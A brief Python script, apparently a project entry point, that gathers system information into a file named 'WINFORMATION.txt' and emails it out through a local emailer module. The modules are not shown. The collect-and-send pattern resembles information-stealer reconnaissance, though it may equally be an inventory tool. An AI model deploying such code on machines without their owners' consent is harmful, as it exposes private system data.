import emailer
import getsysinfo

WINFORMATION = 'WINFORMATION.txt'
getsysinfo.get_sysinfo()
emailer.cast_file_to_message(WINFORMATION)
emailer.send_mail()
#import logging

#logging.basicConfig()
""" def main():
    getsysinfo.get_sysinfo()
    emailer.cast_file_to_message()
    emailer.send_mail()

main() """